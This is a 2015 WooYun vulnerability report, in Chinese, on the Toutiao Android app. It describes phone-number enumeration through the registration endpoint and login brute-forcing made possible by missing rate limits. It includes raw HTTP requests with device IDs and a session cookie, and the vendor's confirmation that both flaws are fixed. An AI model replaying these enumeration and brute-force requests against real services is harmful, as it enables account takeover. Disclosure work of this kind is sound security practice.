{"id": 44328, "wybug_id": "wooyun-2015-0100887", "wybug_title": "今日头条APK两处逻辑漏洞", "wybug_corp": "字节跳动", "wybug_author": "BMa", "wybug_date": "2015-03-13 15:44", "wybug_open_date": "2015-04-27 15:46", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向公众公开  简要描述： 今日头条APK两处逻辑漏洞 详细说明：  一处是注册任意未注册手机号码另一处是登录爆破这两处的关联在于一条信息：\n\n30分钟有效，登录后可以继续使用，有多少用户会在手机客户端修改密码？？这是一处设计缺陷先来注册一个靓号：18888888888注册的接口也可以用来探测该手机号码是否已经注册，如果已经注册，则返回1001，能够注册则返回success，这里可以得到已经注册手机号，然后爆破\nPOST /user/mobile/send_code/ HTTP/1.1Accept-Encoding: gzipContent-Length: 241Content-Type: application/x-www-form-urlencodedHost: ic.snssdk.comConnection: Keep-AliveCookie: install_id=2628615753X-SS-Cookie: install_id=2628615753type=1&mobile=18888888888&iid=2628615753&device_id=3141595700&ac=wifi&channel=360&aid=13&app_name=news_article&version_code=447&device_platform=android&device_type=A0001&os_api=18&os_version=4.3&uuid=864587025424723&openudid=899e7ef4f8892136\n\n\n跑一下验证码，没有频率，次数限制，这是第二处设计缺陷\n\n再次是爆破，安卓客户端没有设置验证码及登录限制，结合上面的用户使用初始的数字或者其他大数据字典，可以爆破\n\n\nPOST /user/mobile/login/ HTTP/1.1Accept-Encoding: gzipContent-Length: 250Content-Type: application/x-www-form-urlencodedHost: ic.snssdk.comConnection: Keep-AliveCookie: install_id=2628615753; sessionid=ffc8759c2a854d00da9b667bb358c5ebX-SS-Cookie: install_id=2628615753; sessionid=ffc8759c2a854d00da9b667bb358c5ebpassword=111111&mobile=188********&iid=2628615753&device_id=3141595700&ac=wifi&channel=360&aid=13&app_name=news_article&version_code=447&device_platform=android&device_type=A0001&os_api=18&os_version=4.3&uuid=864587025424723&openudid=899e7ef4f8892136\n成功爆破用户：\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-16 12:13 厂商回复： 确认漏洞。1. 因更改部署时失误，频次控制失效，已经修复2. 手机是否注册可以枚举；结合初始密码过弱，可定向暴力破解，已经修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-15 14:57 |    \t\t天明 \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:17        | 我要为大叔报仇。)\t\t \n  卧槽，我提交的时候审核人员说验证码是6位，短时间无法爆破，因此不予通过。。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}